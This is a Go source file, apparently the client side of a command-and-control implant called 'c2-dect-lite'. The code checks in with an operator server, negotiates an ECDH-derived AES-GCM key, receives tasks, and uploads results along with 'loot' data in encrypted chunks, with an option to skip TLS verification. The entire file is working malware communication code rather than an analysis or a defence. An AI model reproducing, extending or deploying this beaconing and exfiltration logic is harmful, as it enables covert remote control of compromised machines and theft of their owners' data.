package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"time"

	"golang.org/x/crypto/hkdf"
)

const (
	// kdfInfo binds the derived key to this protocol version.
	kdfInfo = "c2-dect-lite v1 aes"
	// keyLen is the AES-256 key size in bytes.
	keyLen = 32
)

var (
	errRekeyRequired = errors.New("the server asked for a new key")
)

// client talks to the operator server.
type client struct {
	baseURL string
	http    *http.Client
}

func newClient(cfg *Config) *client {
	transport := &http.Transport{
		MaxIdleConns:        4,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		DisableCompression:  false,
	}
	if cfg.UseTLS && cfg.InsecureTLS {
		transport.TLSClientConfig = insecureTLSConfig()
	}
	return &client{
		baseURL: cfg.baseURL(),
		http:    &http.Client{Timeout: cfg.HTTPTimeout, Transport: transport},
	}
}

// checkin performs one beacon and returns the task handed over by the server.
func (c *client) checkin(cfg *Config) (*taskSpec, error) {
	info := buildHello(cfg)
	var env envelope
	if cfg.AESKey == nil || cfg.ServerPub == nil {
		// First contact, or the server asked for a new key: plaintext hello
		// carrying the public key of the agent.
		env = envelope{
			SessionID: cfg.SessionID,
			PublicKey: hex.EncodeToString(cfg.PrivateKey.PublicKey().Bytes()),
			Agent:     info,
		}
	} else {
		encoded, err := seal(cfg.AESKey, body{Type: "checkin", Hello: info})
		if err != nil {
			return nil, err
		}
		env = envelope{SessionID: cfg.SessionID, Data: encoded}
	}

	raw, status, err := c.post("/agent/checkin", env)
	if err != nil {
		return nil, err
	}
	if status == http.StatusConflict {
		// The server lost its key material: drop the local key and retry
		// with a plaintext hello on the next cycle.
		cfg.AESKey = nil
		cfg.ServerPub = nil
		_ = saveState(cfg)
		return nil, errRekeyRequired
	}
	if status != http.StatusOK {
		return nil, fmt.Errorf("server answered %d", status)
	}

	var resp envelope
	if err := json.Unmarshal(raw, &resp); err != nil {
		return nil, fmt.Errorf("invalid answer: %w", err)
	}

	// The server may have renegotiated the transport key.
	if resp.PublicKey != "" {
		if err := applyServerKey(cfg, resp.PublicKey); err != nil {
			return nil, err
		}
	}
	if resp.Data == "" {
		return nil, errors.New("the server answered without a payload")
	}
	plain, err := open(cfg.AESKey, resp.Data)
	if err != nil {
		return nil, fmt.Errorf("could not decrypt the answer: %w", err)
	}
	var answer ack
	if err := json.Unmarshal(plain, &answer); err != nil {
		return nil, fmt.Errorf("invalid payload: %w", err)
	}
	if answer.SessionID != "" {
		cfg.SessionUUID = answer.UUID
	}
	return answer.Task, nil
}

// sendResult returns the outcome of a task, splitting large payloads.
func (c *client) sendResult(cfg *Config, taskID int64, output, errMsg string, success bool,
	lootType, lootName, lootData string) error {

	chunks := splitPayload(output, cfg.ChunkSize)
	total := len(chunks)
	if total == 0 {
		total = 1
	}
	for i, chunk := range chunks {
		payload := body{
			Type:       "result",
			TaskID:     taskID,
			Output:     chunk,
			Error:      errMsg,
			Success:    success,
			ChunkIndex: i,
			ChunkTotal: total,
		}
		if i == total-1 {
			payload.LootType = lootType
			payload.LootName = lootName
			payload.LootData = lootData
		}
		encoded, err := seal(cfg.AESKey, payload)
		if err != nil {
			return err
		}
		env := envelope{SessionID: cfg.SessionID, Data: encoded}
		_, status, err := c.post("/agent/task/result", env)
		if err != nil {
			return err
		}
		if status == http.StatusConflict {
			return errRekeyRequired
		}
		if status != http.StatusOK {
			return fmt.Errorf("the server answered %d", status)
		}
	}
	return nil
}

// post sends one envelope to the server.
func (c *client) post(path string, env envelope) ([]byte, int, error) {
	payload, err := json.Marshal(env)
	if err != nil {
		return nil, 0, err
	}
	req, err := http.NewRequest(http.MethodPost, c.baseURL+path, bytes.NewReader(payload))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "c2-dect-lite-agent/"+Version)
	resp, err := c.http.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, resp.StatusCode, err
	}
	return raw, resp.StatusCode, nil
}

// applyServerKey derives the transport key from the server public key.
func applyServerKey(cfg *Config, serverPubHex string) error {
	raw, err := hex.DecodeString(serverPubHex)
	if err != nil {
		return fmt.Errorf("invalid server key: %w", err)
	}
	pub, err := ecdh.P256().NewPublicKey(raw)
	if err != nil {
		return fmt.Errorf("invalid server key: %w", err)
	}
	if cfg.ServerPub != nil && bytes.Equal(cfg.ServerPub.Bytes(), raw) {
		return nil // the key did not change
	}
	key, err := deriveKey(cfg.PrivateKey, pub, cfg.SessionID)
	if err != nil {
		return err
	}
	cfg.ServerPub = pub
	cfg.AESKey = key
	return saveState(cfg)
}

// deriveKey stretches the ECDH shared secret with HKDF-SHA256.
func deriveKey(priv *ecdh.PrivateKey, peer *ecdh.PublicKey, sessionID string) ([]byte, error) {
	shared, err := priv.ECDH(peer)
	if err != nil {
		return nil, err
	}
	reader := hkdf.New(sha256.New, shared, []byte(sessionID), []byte(kdfInfo))
	key := make([]byte, keyLen)
	if _, err := io.ReadFull(reader, key); err != nil {
		return nil, err
	}
	return key, nil
}

// seal encrypts a payload with AES-256-GCM.
func seal(key []byte, payload any) (string, error) {
	raw, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	if len(key) != keyLen {
		return "", errors.New("the transport key is not initialised")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	out := gcm.Seal(nonce, nonce, raw, nil)
	return base64.StdEncoding.EncodeToString(out), nil
}

// open decrypts a payload produced by seal.
func open(key []byte, encoded string) ([]byte, error) {
	if len(key) != keyLen {
		return nil, errors.New("the transport key is not initialised")
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(raw) < gcm.NonceSize() {
		return nil, errors.New("the payload is truncated")
	}
	out, err := gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
	if err != nil {
		return nil, errors.New("the payload could not be authenticated")
	}
	return out, nil
}

// splitPayload cuts a payload into chunks of at most size bytes.
func splitPayload(payload string, size int) []string {
	if size <= 0 {
		size = 256 * 1024
	}
	if len(payload) <= size {
		return []string{payload}
	}
	var chunks []string
	for start := 0; start < len(payload); start += size {
		end := start + size
		if end > len(payload) {
			end = len(payload)
		}
		chunks = append(chunks, payload[start:end])
	}
	return chunks
}
